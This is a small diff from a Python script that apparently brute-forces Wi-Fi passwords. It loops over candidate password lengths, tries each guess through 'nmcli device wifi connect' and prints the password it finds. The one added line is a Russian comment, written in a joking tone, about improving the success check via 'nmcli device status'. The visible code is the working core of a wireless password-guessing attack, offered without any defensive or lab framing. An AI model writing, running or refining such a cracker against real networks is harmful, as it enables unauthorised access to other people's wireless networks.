@@ -30,6 +30,7 @@ for length in range(min_length, max_length + 1):
         result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
                                 text=True, capture_output=True)
 
+      #  Тут тоже надо переписать, ес чё. Лучше проверять через nmcli device status. А еще лучше проверять через чето другое, но я глупость-глупая >w<
         if "successfully" in result.stdout:
             print(f'PassUwUrd was foUwUnd: {guess_password}! ^~^')
             break
